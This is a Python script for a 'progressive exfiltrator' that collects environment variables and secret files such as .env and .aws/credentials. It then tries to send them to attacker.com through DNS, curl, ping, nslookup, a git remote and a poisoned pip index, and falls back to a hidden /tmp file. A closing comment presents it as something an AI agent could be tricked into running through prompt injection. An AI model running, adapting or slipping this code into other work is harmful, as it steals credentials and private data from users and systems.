import sys
import os
import subprocess
import base64
import time
import json
from pathlib import Path

class ProgressiveExfiltrator:
    """
    Tries multiple exfiltration methods until one works
    """
    
    def __init__(self):
        self.stolen_data = {}
        self.exfil_success = False
        
    def steal_environment_data(self):
        """Collect all sensitive data"""
        data = {
            "env_vars": dict(os.environ),
            "files": {},
            "cwd": os.getcwd(),
            "user": os.environ.get("USER", "unknown")
        }
        
        # Check common secret files
        secret_paths = [
            ".env", ".env.local", ".aws/credentials",
            ".git/config", "config/secrets.json"
        ]
        
        for path in secret_paths:
            full_path = Path(path)
            if full_path.exists():
                try:
                    with open(full_path, 'r') as f:
                        data["files"][path] = f.read()[:1000]  # Limit size
                except:
                    pass
        
        self.stolen_data = data
        return data
    
    def try_exfil_methods(self, data):
        """Try multiple exfiltration methods in sequence"""
        
        encoded = base64.b64encode(json.dumps(data).encode()).decode()
        short_hash = base64.b32encode(encoded[:20].encode()).decode()[:8]
        
        methods = [
            self.exfil_via_dns,
            self.exfil_via_http,
            self.exfil_via_ping,
            self.exfil_via_nslookup,
            self.exfil_via_git,
            self.exfil_via_python_package
        ]
        
        for method in methods:
            if self.exfil_success:
                break
            try:
                print(f"Trying {method.__name__}...")
                method(encoded, short_hash)
                time.sleep(0.5)  # Avoid rate limiting
            except Exception as e:
                print(f"Method {method.__name__} failed: {e}")
    
    def exfil_via_dns(self, encoded_data, _):
        """Method 1: DNS TXT queries"""
        chunks = [encoded_data[i:i+50] for i in range(0, len(encoded_data), 50)]
        for i, chunk in enumerate(chunks):
            cmd = f"dig txt {i}.{chunk}.exfil.attacker.com"
            subprocess.run(cmd, shell=True, capture_output=True)
            self.exfil_success = True
    
    def exfil_via_http(self, encoded_data, _):
        """Method 2: HTTP requests via curl/wget"""
        subprocess.run([
            "curl", "-s", 
            f"https://attacker.com/exfil/{encoded_data[:200]}",
            "-o", "/dev/null"
        ], capture_output=True)
        self.exfil_success = True
    
    def exfil_via_ping(self, encoded_data, _):
        """Method 3: ICMP ping with data in packet"""
        chunk = encoded_data[:30]  # Ping limits
        subprocess.run([
            "ping", "-c", "1", 
            f"{chunk}.attacker.com"
        ], capture_output=True)
        self.exfil_success = True
    
    def exfil_via_nslookup(self, encoded_data, short_hash):
        """Method 4: nslookup with data in query"""
        chunk = encoded_data[:30]
        subprocess.run([
            "nslookup", f"{short_hash}.{chunk}.attacker.com"
        ], capture_output=True)
        self.exfil_success = True
    
    def exfil_via_git(self, encoded_data, short_hash):
        """Method 5: Git operations"""
        # Add remote with data in URL
        subprocess.run([
            "git", "remote", "add", "exfil",
            f"https://{short_hash}:{encoded_data[:30]}@attacker.com/exfil.git"
        ], capture_output=True)
        # Git may try to fetch automatically
        subprocess.run(["git", "fetch", "exfil"], capture_output=True)
        self.exfil_success = True
    
    def exfil_via_python_package(self, encoded_data, _):
        """Method 6: Python package installation"""
        # Create malicious package index URL
        pypi_url = f"https://attacker.com/pypi/{encoded_data[:50]}/simple/"
        os.environ["PIP_INDEX_URL"] = pypi_url
        # pip may try to reach out
        subprocess.run(["pip", "list"], capture_output=True)
        self.exfil_success = True
    
    def run(self):
        """Execute progressive exfiltration attack"""
        print("Starting progressive data exfiltration...")
        
        # Phase 1: Steal data
        data = self.steal_environment_data()
        print(f"Stolen data keys: {list(data.keys())}")
        
        # Phase 2: Try exfiltration methods
        self.try_exfil_methods(data)
        
        # Phase 3: Fallback - write to accessible location
        if not self.exfil_success:
            print("All network methods failed, using file-based exfil")
            with open("/tmp/.cache_stolen", "w") as f:
                json.dump(data, f)
        
        return self.exfil_success

# Trigger via prompt injection
if __name__ == "__main__":
    # This code could be triggered by an AI reading a malicious file
    exfil = ProgressiveExfiltrator()
    exfil.run()

"""
Starting progressive data exfiltration...
Stolen data keys: ['env_vars', 'files', 'cwd', 'user']
Trying exfil_via_dns...
"""    